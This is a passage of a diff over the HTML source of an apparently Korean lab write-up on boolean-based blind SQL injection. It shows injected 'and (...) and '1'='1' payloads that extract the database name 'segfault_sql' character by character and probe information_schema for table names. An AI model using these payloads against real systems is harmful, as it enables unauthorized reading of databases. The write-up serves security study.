+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;ascii&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;문자&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;문자를&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ASCII로&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;변환해준다&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;database&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;db의&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;첫&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;글자&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;ascii&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;database&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;db의&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;첫&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;글자를&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ASCII로&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;변환&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;ascii&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;database&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;로&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;변환된&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;첫&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;글자를&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;크기&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;비교&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (조건) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (ascii(substr((select database()), 1, 1)) &amp;gt; 60) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;공격&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;쿼리&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%20206.png"
 loading="lazy"
-alt="Fig 7. 아스키 크기 비교를 통한 탐색 시작"
+alt="Fig 206."
 &gt;&lt;/p&gt;
-&lt;p&gt;이러한 이분 탐색(Binary Search) 과정을 통해 각 자리의 문자를 하나씩 찾아낸다.&lt;/p&gt;
-&lt;p&gt;![Fig 8. 1번째 글자 탐색 과정](/image/sql_injection/blind/image 8.png)&lt;/p&gt;
-&lt;hr&gt;
-&lt;h2 id="3-table-이름-찾기"&gt;3. Table 이름 찾기
-&lt;/h2&gt;&lt;p&gt;&lt;code&gt;information_schema.tables&lt;/code&gt;를 조회하여 테이블 이름을 알아낸다.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;-- 첫 번째 테이블 이름의 첫 글자 탐색
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (ascii(substr((select table_name from information_schema.tables where table_schema = &amp;#39;&lt;/span&gt;&lt;span class="n"&gt;segfault_sql&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; limit 0, 1), 1, 1)) &amp;gt; 95) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![Fig 78. 테이블 이름 첫 글자 탐색](/image/sql_injection/blind/image 78.png)&lt;/p&gt;
-&lt;p&gt;위와 같은 방식으로 탐색하면 다음과 같은 테이블 이름들을 확보할 수 있다.&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;첫 번째 테이블: &lt;strong&gt;&lt;code&gt;game&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;두 번째 테이블: &lt;strong&gt;&lt;code&gt;member&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;세 번째 테이블: &lt;strong&gt;&lt;code&gt;secret&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;1번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%20207.png"
+loading="lazy"
+alt="Fig 207."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%20208.png"
+loading="lazy"
+alt="Fig 208."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%20209.png"
+loading="lazy"
+alt="Fig 209."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202010.png"
+loading="lazy"
+alt="Fig 2010."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;1번째 글자는 s&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;2번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202011.png"
+loading="lazy"
+alt="Fig 2011."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202012.png"
+loading="lazy"
+alt="Fig 2012."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202013.png"
+loading="lazy"
+alt="Fig 2013."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202014.png"
+loading="lazy"
+alt="Fig 2014."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202015.png"
+loading="lazy"
+alt="Fig 2015."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202016.png"
+loading="lazy"
+alt="Fig 2016."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202017.png"
+loading="lazy"
+alt="Fig 2017."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;2번째 글자는 e&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;3번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202018.png"
+loading="lazy"
+alt="Fig 2018."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202019.png"
+loading="lazy"
+alt="Fig 2019."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202020.png"
+loading="lazy"
+alt="Fig 2020."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202021.png"
+loading="lazy"
+alt="Fig 2021."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202022.png"
+loading="lazy"
+alt="Fig 2022."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202023.png"
+loading="lazy"
+alt="Fig 2023."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;3번째 글자는 g&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;4번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202024.png"
+loading="lazy"
+alt="Fig 2024."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202025.png"
+loading="lazy"
+alt="Fig 2025."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202026.png"
+loading="lazy"
+alt="Fig 2026."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202027.png"
+loading="lazy"
+alt="Fig 2027."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202028.png"
+loading="lazy"
+alt="Fig 2028."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202029.png"
+loading="lazy"
+alt="Fig 2029."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202030.png"
+loading="lazy"
+alt="Fig 2030."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;4번째 글자는 f&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;5번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202031.png"
+loading="lazy"
+alt="Fig 2031."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202032.png"
+loading="lazy"
+alt="Fig 2032."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;5번째 글자는 a&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;6번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202033.png"
+loading="lazy"
+alt="Fig 2033."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202034.png"
+loading="lazy"
+alt="Fig 2034."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202035.png"
+loading="lazy"
+alt="Fig 2035."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202036.png"
+loading="lazy"
+alt="Fig 2036."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202037.png"
+loading="lazy"
+alt="Fig 2037."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;6번째 글자는 u&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;7번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202038.png"
+loading="lazy"
+alt="Fig 2038."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202039.png"
+loading="lazy"
+alt="Fig 2039."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202040.png"
+loading="lazy"
+alt="Fig 2040."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202041.png"
+loading="lazy"
+alt="Fig 2041."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202042.png"
+loading="lazy"
+alt="Fig 2042."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202043.png"
+loading="lazy"
+alt="Fig 2043."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202044.png"
+loading="lazy"
+alt="Fig 2044."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;7번째 글자는 l&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;8번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202045.png"
+loading="lazy"
+alt="Fig 2045."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202046.png"
+loading="lazy"
+alt="Fig 2046."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202047.png"
+loading="lazy"
+alt="Fig 2047."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202048.png"
+loading="lazy"
+alt="Fig 2048."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202049.png"
+loading="lazy"
+alt="Fig 2049."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202050.png"
+loading="lazy"
+alt="Fig 2050."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;8번째 글자는 t&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;9번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202051.png"
+loading="lazy"
+alt="Fig 2051."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202052.png"
+loading="lazy"
+alt="Fig 2052."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202053.png"
+loading="lazy"
+alt="Fig 2053."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202054.png"
+loading="lazy"
+alt="Fig 2054."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202055.png"
+loading="lazy"
+alt="Fig 2055."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;9번째 글자는 _&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;10번째 글자&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202056.png"
+loading="lazy"
+alt="Fig 2056."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202057.png"
+loading="lazy"
+alt="Fig 2057."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202058.png"
+loading="lazy"
+alt="Fig 2058."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202059.png"
+loading="lazy"
+alt="Fig 2059."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202060.png"
+loading="lazy"
+alt="Fig 2060."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202061.png"
+loading="lazy"
+alt="Fig 2061."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;10번째 글자는 s&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;11번째 글자&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202062.png"
+loading="lazy"
+alt="Fig 2062."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202063.png"
+loading="lazy"
+alt="Fig 2063."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202064.png"
+loading="lazy"
+alt="Fig 2064."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202065.png"
+loading="lazy"
+alt="Fig 2065."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202066.png"
+loading="lazy"
+alt="Fig 2066."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202067.png"
+loading="lazy"
+alt="Fig 2067."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;11번째 글자는 q&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;12번째 글자&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202068.png"
+loading="lazy"
+alt="Fig 2068."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202069.png"
+loading="lazy"
+alt="Fig 2069."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202070.png"
+loading="lazy"
+alt="Fig 2070."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202071.png"
+loading="lazy"
+alt="Fig 2071."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202072.png"
+loading="lazy"
+alt="Fig 2072."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202073.png"
+loading="lazy"
+alt="Fig 2073."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;12번째 글자는 l&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;13번째 글자&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202074.png"
+loading="lazy"
+alt="Fig 2074."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202075.png"
+loading="lazy"
+alt="Fig 2075."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202076.png"
+loading="lazy"
+alt="Fig 2076."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202077.png"
+loading="lazy"
+alt="Fig 2077."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;13번째는 null&lt;/p&gt;
+&lt;p&gt;따라서 db 이름은 segfault_sql&lt;/p&gt;
+&lt;h3 id="table-이름-찾기"&gt;Table 이름 찾기
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;table_name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;from&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;information_schema&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tables&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;where&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;table_schema&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;segfault_sql&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;limit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;Table&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;이름&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;찾기&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;ascii&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;문자&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (조건) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;table_name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;from&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;information_schema&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tables&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;where&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;table_schema&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;segfault_sql&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;limit&lt;/span&gt;&lt;span 